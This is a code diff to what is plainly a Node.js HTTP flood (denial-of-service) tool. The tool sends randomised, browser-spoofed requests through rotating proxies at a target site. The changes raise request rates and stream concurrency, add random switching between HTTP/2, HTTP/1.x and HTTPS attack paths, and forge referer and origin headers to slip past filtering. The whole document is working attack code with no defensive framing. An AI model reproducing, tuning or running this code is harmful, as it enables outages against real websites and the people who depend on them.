@@ -5,6 +5,8 @@ const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
+const http = require("http");
+const https = require("https");
 
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
@@ -111,9 +113,13 @@ const rateHeaders = [
     { "user-agent": randstr(12) }
 ];
 
+var siga = sig[Math.floor(Math.random() * sig.length)];
+var ver = version[Math.floor(Math.random() * version.length)];
+var accept = accept_header[Math.floor(Math.random() * accept_header.length)];
+var lang = lang_header[Math.floor(Math.random() * lang_header.length)];
+var encoding = encoding_header[Math.floor(Math.random() * encoding_header.length)];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);
-let proxyIndex = 0;
 
 if (cluster.isMaster) {
     for (let counter = 1; counter <= args.threads; counter++) {
@@ -126,7 +132,7 @@ if (cluster.isMaster) {
     console.log('\x1b[1m\x1b[31m' + 'Requests per second: ' + '\x1b[0m' + '\x1b[1m' + args.Rate + '\x1b[0m');
     setTimeout(() => process.exit(1), args.time * 1000);
 } else {
-    setInterval(runFlooder, 100);
+    setInterval(runFlooder, 50);
 }
 
 class NetSocket {
@@ -174,31 +180,32 @@ class NetSocket {
 const Socker = new NetSocket();
 headers[":method"] = "GET";
 headers[":authority"] = parsedTarget.host;
-headers[":path"] = parsedTarget.path + "?" + randstr(10) + "=" + randstr(5);
+headers[":path"] = parsedTarget.path + "?" + randstr(15) + "=" + randstr(10);
 headers[":scheme"] = "https";
-headers["sec-ch-ua"] = version[Math.floor(Math.random() * version.length)];
+headers["sec-ch-ua"] = ver;
 headers["sec-ch-ua-platform"] = "Windows";
 headers["sec-ch-ua-mobile"] = "?0";
-headers["accept-encoding"] = encoding_header[Math.floor(Math.random() * encoding_header.length)];
-headers["accept-language"] = lang_header[Math.floor(Math.random() * lang_header.length)];
+headers["accept-encoding"] = encoding;
+headers["accept-language"] = lang;
 headers["upgrade-insecure-requests"] = "1";
-headers["accept"] = accept_header[Math.floor(Math.random() * accept_header.length)];
+headers["accept"] = accept;
 headers["sec-fetch-mode"] = "navigate";
 headers["sec-fetch-dest"] = "document";
 headers["sec-fetch-site"] = "same-origin";
 headers["sec-fetch-user"] = "?1";
 headers["x-requested-with"] = "XMLHttpRequest";
+headers["referer"] = "https://" + parsedTarget.host + "/" + randstr(8);
+headers["origin"] = "https://" + parsedTarget.host;
 
 function runFlooder() {
-    const proxyAddr = proxies[proxyIndex];
-    proxyIndex = (proxyIndex + 1) % proxies.length;
+    const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
-        timeout: 10
+        timeout: 15
     };
 
     Socker.HTTP(proxyOptions, (connection, error) => {
@@ -207,90 +214,149 @@ function runFlooder() {
                 connection.close();
                 connection.destroy();
             }
-            return setTimeout(() => runFlooder(), 100);
+            return setTimeout(runFlooder, 100);
         }
 
-        const tlsOptions = (() => {
-            const useTlsOption2 = (Math.random() < 0.5);
-            return useTlsOption2 ?
-                {
-                    secure: true,
-                    ALPNProtocols: ['h2'],
-                    sigals: sig[Math.floor(Math.random() * sig.length)],
+        const protocolChoice = Math.random();
+        const dynHeaders = {
+            ...headers,
+            ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
+        };
+
+        if (protocolChoice < 0.25) {
+            const tlsOptions = {
+                secure: true,
+                ALPNProtocols: ['h2'],
+                sigals: siga,
+                socket: connection,
+                ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
+                ecdhCurve: 'P-256:P-384',
+                host: parsedTarget.host,
+                servername: parsedTarget.host,
+                rejectUnauthorized: false
+            };
+
+            const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
+            tlsConn.setKeepAlive(true, 60000);
+
+            const client = http2.connect(parsedTarget.href, {
+                protocol: "https:",
+                settings: {
+                    headerTableSize: 65536,
+                    maxConcurrentStreams: 500,
+                    initialWindowSize: 12582912,
+                    maxHeaderListSize: 65536,
+                    enablePush: false
+                },
+                createConnection: () => tlsConn
+            });
+
+            client.on("connect", () => {
+                const IntervalAttack = setInterval(() => {
+                    for (let i = 0; i < args.Rate * 2; i++) {
+                        const request = client.request(dynHeaders);
+                        request.on("response", response => {
+                            request.close();
+                            request.destroy();
+                        });
+                        request.on("error", () => {
+                            request.close();
+                            request.destroy();
+                        });
+                        request.end();
+                    }
+                }, 50);
+                setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
+            });
+
+            client.on("error", () => {
+                client.destroy();
+                tlsConn.destroy();
+                connection.destroy();
+                setTimeout(runFlooder, 100);
+            });
+
+            client.on("close", () => {
+                client.destroy();
+                tlsConn.destroy();
+                connection.destroy();
+                setTimeout(runFlooder, 100);
+            });
+        } else if (protocolChoice < 0.50) {
+            const httpOptions = {
+                host: parsedTarget.host,
+                port: 80,
+                path: parsedTarget.path + "?" + randstr(15) + "=" + randstr(10),
+                method: "GET",
+                headers: { ...dynHeaders, "connection": "keep-alive" },
+                agent: new http.Agent({ keepAlive: true, maxSockets: 100 }),
+                createConnection: () => connection
+            };
+
+            const req = http.request(httpOptions, (res) => {
+                res.on("data", () => {});
+                res.on("end", () => {
+                    connection.destroy();
+                });
+            });
+
+            req.on("error", () => {
+                connection.destroy();
+                setTimeout(runFlooder, 100);
+            });
+
+            req.end();
+        } else if (protocolChoice < 0.75) {
+            const http10Options = {
+                host: parsedTarget.host,
+                port: 80,
+                path: parsedTarget.path + "?" + randstr(15) + "=" + randstr(10),
+                method: "GET",
+                headers: { ...dynHeaders, "connection": "close" },
+                createConnection: () => connection
+            };
+
+            const req = http.request(http10Options, (res) => {
+                res.on("data", () => {});
+                res.on("end", () => {
+                    connection.destroy();
+                });
+            });
+
+            req.on("error", () => {
+                connection.destroy();
+                setTimeout(runFlooder, 100);
+            });
+
+            req.end();
+        } else {
+            const httpsOptions = {
+                host: parsedTarget.host,
+                port: 443,
+                path: parsedTarget.path + "?" + randstr(15) + "=" + randstr(10),
+                method: "GET",
+                headers: dynHeaders,
+                agent: new https.Agent({ keepAlive: true, maxSockets: 100, rejectUnauthorized: false }),
+                createConnection: () => tls.connect(443, parsedTarget.host, {
                     socket: connection,
                     ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
-                    ecdhCurve: 'P-256:P-384',
-                    host: parsedTarget.host,
-                    servername: parsedTarget.host,
                     rejectUnauthorized: false
-                } :
-                {
-                    secure: true,
-                    ALPNProtocols: ['h2'],
-                    ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
-                    ecdhCurve: 'auto',
-                    rejectUnauthorized: false,
-                    servername: parsedTarget.host,
-                    secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
-                        crypto.constants.SSL_OP_NO_TICKET |
-                        crypto.constants.SSL_OP_NO_COMPRESSION |
-                        crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
-                        crypto.constants.SSL_OP_NO_RENEGOTIATION |
-                        crypto.constants.SSL_OP_SINGLE_DH_USE |
-                        crypto.constants.SSL_OP_SINGLE_ECDH_USE |
-                        crypto.constants.SSL_OP_NO_QUERY_MTU
-                };
-        })();
+                })
+            };
 
-        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
-        tlsConn.setKeepAlive(true, 60000);
+            const req = https.request(httpsOptions, (res) => {
+                res.on("data", () => {});
+                res.on("end", () => {
+                    connection.destroy();
+                });
+            });
 
-        const client = http2.connect(parsedTarget.href, {
-            protocol: "https:",
-            settings: {
-                headerTableSize: 65536,
-                maxConcurrentStreams: 100,
-                initialWindowSize: 6291456,
-                maxHeaderListSize: 65536,
-                enablePush: false
-            },
-            createConnection: () => tlsConn
-        });
+            req.on("error", () => {
+                connection.destroy();
+                setTimeout(runFlooder, 100);
+            });
 
-        client.on("connect", () => {
-            const IntervalAttack = setInterval(() => {
-                const dynHeaders = {
-                    ...headers,
-                    ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
-                };
-                for (let i = 0; i < args.Rate; i++) {
-                    const request = client.request(dynHeaders);
-                    request.on("response", response => {
-                        request.close();
-                        request.destroy();
-                    });
-                    request.on("error", () => {
-                        request.close();
-                        request.destroy();
-                    });
-                    request.end();
-                }
-            }, 100);
-            setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
-        });
-
-        client.on("error", () => {
-            client.destroy();
-            tlsConn.destroy();
-            connection.destroy();
-            setTimeout(() => runFlooder(), 100);
-        });
-
-        client.on("close", () => {
-            client.destroy();
-            tlsConn.destroy();
-            connection.destroy();
-            setTimeout(() => runFlooder(), 100);
-        });
+            req.end();
+        }
     });
 }
